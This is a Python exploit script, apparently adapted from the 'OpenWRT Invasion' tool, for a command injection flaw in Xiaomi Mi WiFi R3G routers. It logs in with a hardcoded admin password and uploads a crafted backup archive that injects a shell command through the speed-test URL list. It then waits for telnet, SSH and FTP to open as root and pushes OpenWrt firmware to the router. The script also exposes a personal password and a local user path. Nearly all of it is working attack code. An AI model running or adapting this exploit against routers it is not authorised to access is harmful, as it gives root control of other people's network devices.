#!/usr/bin/python
# There is a remote command execution vulnerability in Xiaomi Mi WiFi R3G before version stable 2.28.23.
# The backup file is in tar.gz format. After uploading, the application uses the tar zxf command to decompress,
# so you can control the contents of the files in the decompressed directory.
# In addition, the application's sh script for testing upload and download speeds will read the url list from /tmp/speedtest_urls.xml,
# and there is a command injection vulnerability.

# discoverer: UltramanGaia from Kap0k & Zhiniang Peng from Qihoo 360 Core Security

# HOW TO RUN
# Install requirements
# pip3 install -r requirements.txt
# Run the script
# python3 remote_command_execution_vulnerability.py

import os
import shutil
import tarfile
import requests
import sys
import re
import time
import random
import hashlib
import threading
import socket
import io
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

router_ip_address="192.168.31.1"
#router_ip_address = "miwifi.com"
#router_ip_address = input("Router IP address [press enter for using the default '{}']: ".format(router_ip_address)) or router_ip_address

# Performance Configuration
# Adjust these settings based on your network speed and router response time
PERFORMANCE_SETTINGS = {
    # Socket connection timeout (seconds)
    'timeout': 2.0,
    # Number of retry attempts for failed connections
    'retries': 3,
    # Delay between retry attempts (seconds)
    'delay': 0.5,
    # HTTP connection timeout (seconds)
    'connect_timeout': 1.0,
    # HTTP read timeout (seconds)
    'read_timeout': 5.0,
    # Maximum time to wait for services to start (seconds)
    'max_service_wait': 15.0,
    # Number of parallel workers for port checking
    'max_workers': 3
}

# For faster execution on good networks, use these settings:
# PERFORMANCE_SETTINGS.update({'timeout': 1.0, 'retries': 2, 'delay': 0.25, 'connect_timeout': 0.5, 'read_timeout': 3.0})

# For slower/unreliable networks, use these settings:
# PERFORMANCE_SETTINGS.update({'timeout': 5.0, 'retries': 5, 'delay': 1.0, 'connect_timeout': 2.0, 'read_timeout': 8.0})

class OptimizedSession:
    """HTTP session with connection pooling and retry logic for better performance."""
    
    def __init__(self):
        self.session = requests.Session()
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=PERFORMANCE_SETTINGS['retries'],
            status_forcelist=[429, 500, 502, 503, 504],
            backoff_factor=0.3
        )
        
        # Configure adapter with connection pooling
        adapter = HTTPAdapter(
            pool_maxsize=10,
            pool_block=True,
            max_retries=retry_strategy
        )
        
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
    
    def get(self, url, **kwargs):
        """Perform GET request with optimized timeouts."""
        timeout = kwargs.pop('timeout', (PERFORMANCE_SETTINGS['connect_timeout'], PERFORMANCE_SETTINGS['read_timeout']))
        return self.session.get(url, timeout=timeout, **kwargs)
    
    def post(self, url, **kwargs):
        """Perform POST request with optimized timeouts."""
        timeout = kwargs.pop('timeout', (PERFORMANCE_SETTINGS['connect_timeout'], PERFORMANCE_SETTINGS['read_timeout']))
        return self.session.post(url, timeout=timeout, **kwargs)

# Initialize optimized session
optimized_session = OptimizedSession()

def check_port_fast(host, port, timeout=PERFORMANCE_SETTINGS['timeout']):
    """Fast port checking with non-blocking socket."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    
    try:
        result = sock.connect_ex((host, port))
        return result == 0
    except (socket.timeout, socket.error):
        return False
    finally:
        sock.close()

def check_ports_parallel(host, ports, max_workers=None):
    """Check multiple ports in parallel for faster service detection."""
    if max_workers is None:
        max_workers = PERFORMANCE_SETTINGS['max_workers']
    results = {}
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all port checks
        future_to_port = {
            executor.submit(check_port_fast, host, port): port 
            for port in ports
        }
        
        # Collect results as they complete
        for future in as_completed(future_to_port):
            port = future_to_port[future]
            try:
                results[port] = future.result()
            except Exception:
                results[port] = False
    
    return results

# get stok
def get_stok(router_ip_address):
    """Optimized stok retrieval using connection pooling."""
    try: 
        r0 = optimized_session.get("http://{router_ip_address}/cgi-bin/luci/web".format(router_ip_address=router_ip_address))
    except Exception as e:
        print(f"Xiaomi router not found: {e}")
        return None
    try:	
        mac = re.findall(r'deviceId = \'(.*?)\'', r0.text)[0]
    except:
        print ("Xiaomi router not found...")
        return None
    key = re.findall(r'key: \'(.*)\',', r0.text)[0]
    nonce = "0_" + mac + "_" + str(int(time.time())) + "_" + str(random.randint(1000, 10000))
    router_password = "northman98"
    #router_password = input("Enter router admin password: ")
    account_str = hashlib.sha1((router_password + key).encode('utf-8')).hexdigest()
    password = hashlib.sha1((nonce + account_str).encode('utf-8')).hexdigest()
    data = "username=admin&password={password}&logtype=2&nonce={nonce}".format(password=password,nonce=nonce)
    r1 = optimized_session.post("http://{router_ip_address}/cgi-bin/luci/api/xqsystem/login".format(router_ip_address=router_ip_address), 
        data = data, 
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
    try:
        stok = re.findall(r'"token":"(.*?)"',r1.text)[0]
    except:
        print("Failed to get stok in login response '{}'".format(r1.text))
        return None
    return stok

# Performance timing
start_time = time.time()
print("OpenWRT Invasion - Performance Optimized")
print("=" * 50)

stok = get_stok(router_ip_address) or input("You need to get the stok manually, then input the stok here: ")
print("""There two options to provide the files needed for invasion:
   1. Use a local TCP file server runing on random port to provide files in local directory `script_tools`.
   2. Download needed files from remote github repository. (choose this option only if github is accessable inside router device.)""")
use_local_file_server = False  # Automatically use option 1
#use_local_file_server = (input("Which option do you prefer? (default: 1)") or "1") == "1"

# From https://blog.securityevaluators.com/show-mi-the-vulns-exploiting-command-injection-in-mi-router-3-55c6bcb48f09
# In the attacking machine (macos), run the following before executing this script: /usr/bin/nc -l 4444
command = "((sh /tmp/script.sh exploit) &)"

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

def create_payload_in_memory():
    """Create exploit payload in memory without temporary files for better performance."""
    print("Creating payload in memory...")
    
    # Create speedtest config in memory
    try:
        with open("speedtest_urls_template.xml", "rt", encoding="UTF-8") as f:
            template = f.read()
    except FileNotFoundError:
        print("speedtest_urls_template.xml not found")
        return None
    
    speedtest_data = template.format(
        router_ip_address=router_ip_address,
        command=command
    )
    
    # Create tar.gz in memory
    payload_buffer = io.BytesIO()
    
    with tarfile.open(fileobj=payload_buffer, mode="w:gz") as tar:
        # Add speedtest config
        speedtest_info = tarfile.TarInfo(name="speedtest_urls.xml")
        speedtest_info.size = len(speedtest_data.encode('utf-8'))
        speedtest_info.mtime = int(time.time())
        tar.addfile(speedtest_info, io.BytesIO(speedtest_data.encode('utf-8')))
        
        # Add script
        if os.path.exists("script.sh"):
            tar.add("script.sh")
        else:
            print("Warning: script.sh not found")
    
    payload_buffer.seek(0)
    return payload_buffer.getvalue()

print("****************")
print("router_ip_address: " + router_ip_address)
print("stok: " + stok)
print("file provider: " + ("local file server" if use_local_file_server else "remote github repository"))
print("****************")

# Create payload in memory
payload_data = create_payload_in_memory()
if not payload_data:
    print("Failed to create payload")
    sys.exit(1)

# upload config file
print("start uploading config file...")
r1 = optimized_session.post(
    "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(router_ip_address, stok),
    files={"image": ("payload.tar.gz", payload_data, "application/gzip")},
    proxies=proxies
)
# print(r1.text)

def send_test_netspeed_request(router_ip_address, stok, port):
    """Optimized netspeed request using connection pooling."""
    r = optimized_session.get(
        "http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed?{}".format(router_ip_address, stok, port),
        proxies=proxies
    )
    # print(r.text)

def wait_for_services_parallel(router_ip_address, max_wait=None):
    """Wait for router services using parallel port checking for faster detection."""
    if max_wait is None:
        max_wait = PERFORMANCE_SETTINGS['max_service_wait']
    print("Waiting for services to start...")
    target_ports = [22, 23, 21]  # SSH, Telnet, FTP
    start_time = time.time()
    backoff = 0.3  # Start with 300ms
    
    while time.time() - start_time < max_wait:
        # Check all ports in parallel
        results = check_ports_parallel(router_ip_address, target_ports)
        
        # Return first available port
        for port, is_open in results.items():
            if is_open:
                service_names = {22: "SSH", 23: "Telnet", 21: "FTP"}
                print(f"{service_names.get(port, 'Service')} is ready on port {port}")
                return port
        
        # Exponential backoff, cap at 2 seconds
        time.sleep(min(backoff, 2.0))
        backoff *= 1.5
    
    print("No services responded within timeout")
    return None

# exec download speed test, exec command
print("start exec command...")
if use_local_file_server:
    from tcp_file_server import TcpFileServer
    file_server = TcpFileServer("script_tools")

    with file_server:
        # The TCP file server will use a random port number.
        # And this port number will be sent to the router luci web server through query parameters of testing net speed request here.
        # Then in the injected `script.sh`, we can get the client IP address and file server port
        # through CGI variables `REMOTE_ADDR` and `QUERY_STRING` to download needed files.
        send_test_netspeed_request(router_ip_address, stok, file_server.port)
else:  # Use remote github repository. port setted to 0.
    send_test_netspeed_request(router_ip_address, stok, port=0)

# Use optimized parallel service checking
print("Checking for available services...")
available_port = wait_for_services_parallel(router_ip_address)

# Calculate total execution time
total_time = time.time() - start_time

if available_port:
    print(f"\n✓ Exploit successful in {total_time:.1f}s!")
    print("Connection options (user: root, password: root):")
    print("* telnet {}".format(router_ip_address))
    print("* ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc -o UserKnownHostsFile=/dev/null root@{}".format(router_ip_address))
    print("* ftp: using a program like cyberduck")
else:
    print(f"\nExploit may have succeeded but services not detected (took {total_time:.1f}s)")
    print("Try manual connection: telnet {}".format(router_ip_address))

# Automatically open new command prompt and run telnet on Windows
import platform
if platform.system() == "Windows":
    import subprocess
    print("\nOpening new command prompt with telnet connection...")
    try:
        # Create a PowerShell script that can handle telnet interaction
        ps_script = f"""
$process = Start-Process -FilePath "telnet" -ArgumentList "{router_ip_address}" -PassThru -NoNewWindow
Start-Sleep -Seconds 3
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait("root")
[System.Windows.Forms.SendKeys]::SendWait("{{ENTER}}")
"""
        
        # Write PowerShell script to file
        with open("telnet_auto.ps1", "w") as f:
            f.write(ps_script)
        
        # Open new cmd window and run telnet directly
        subprocess.Popen(["cmd", "/k", "telnet", router_ip_address], 
                        creationflags=subprocess.CREATE_NEW_CONSOLE)
        
        print("New command prompt opened with telnet {} command".format(router_ip_address))
        print("Login credentials: root/root")
        print("Note: You'll need to manually type 'root' at the login prompt")
        print("Tip: You can copy 'root' and paste it at the login prompt")

        # Prepare and open another cmd window to upload firmware via FTP to /tmp
        firmware_path = r"C:\Users\rahma\Documents\openwrt\4C\openwrt-22.03.3-ramips-mt76x8-xiaomi_mi-router-4c-squashfs-sysupgrade.bin"
        ftp_script = f"""open {router_ip_address}
root
root
binary
cd /tmp
put "{firmware_path}"
bye
"""
        with open("ftp_upload.txt", "w", encoding="utf-8") as f:
            f.write(ftp_script)
        subprocess.Popen(["cmd", "/k", "ftp", "-s:ftp_upload.txt"],
                         creationflags=subprocess.CREATE_NEW_CONSOLE)
        print("Opened another command prompt to run FTP upload to /tmp as root/root.")
        
        # Schedule SSH setup script to run after 4 minutes
        def run_ssh_setup_after_delay():
            print(f"\nWaiting 4 minutes before running SSH setup script...")
            time.sleep(240)  # 4 minutes = 240 seconds
            print("Executing SSH setup script...")
            try:
                subprocess.run(["python", "ssh_router_setup.py"], check=True)
                print("SSH setup script completed successfully!")
            except subprocess.CalledProcessError as e:
                print(f"SSH setup script failed with error: {e}")
            except FileNotFoundError:
                print("Error: ssh_router_setup.py not found in current directory")
            except Exception as e:
                print(f"Unexpected error running SSH setup script: {e}")
        
        # Start the scheduled task in a separate thread
        ssh_scheduler = threading.Thread(target=run_ssh_setup_after_delay, daemon=True)
        ssh_scheduler.start()
        print("Scheduled SSH setup script to run in 4 minutes...")
        
    except Exception as e:
        print("Failed to open command prompt: {}".format(e))
else:
    print("\nOn non-Windows systems, manually run: telnet {}".format(router_ip_address))
    print("Login credentials: root/root")
